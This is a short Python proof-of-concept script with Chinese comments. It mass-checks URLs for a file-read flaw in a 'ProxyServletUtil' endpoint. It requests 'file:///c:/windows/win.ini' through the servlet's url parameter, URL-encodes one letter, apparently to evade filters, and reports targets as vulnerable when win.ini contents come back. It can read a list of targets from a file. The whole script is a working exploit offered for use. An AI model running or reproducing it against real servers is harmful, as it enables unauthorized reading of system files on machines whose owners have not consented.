# -*- coding: utf-8 -*-
# @Author  : beitso
# explanation: 一个菜🐶的poc


import argparse
import requests
import urllib3
import warnings
warnings.filterwarnings("ignore")

parser = argparse.ArgumentParser(description='帮助信息')
parser.add_argument('-u', '--url', help='输入需要验证的URL', default='')
parser.add_argument('-f', '--file', help='输入url文件', default='')
args = parser.parse_args()
urllib3.disable_warnings()

# 全局请求头，可根据不同的脚进行验证
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",

}
## windocs 服务器
path = 'ProxyServletUti'+'%6c'+'?url=file:///c:/windows/win.ini'


def check(url):
    url = url.strip('/')
    s = requests.Session()
    req = requests.Request('GET', url, headers=headers)
    p = req.prepare()
    p.url += path
    resp = s.send(p)

    try:
        if 'fonts' in resp.text and '[extensions]' in resp.text and resp.status_code == 200:
            print("✅  漏洞存在！！！" + "当前URL为：" + url)
        else:
            print("❌  漏洞不存在！！"+ "当前URL为：" + url)
    except Exception as e:
        print("出现异常，请手工利用")


def more(file):
    f = open(file, 'r')
    for i in f.readlines():
        i = i.strip()
        check(i)


if __name__ == '__main__':
    if args.url != '' and args.file == '':
        check(args.url)
    if args.url == '' and args.file != '':
        more(args.file)


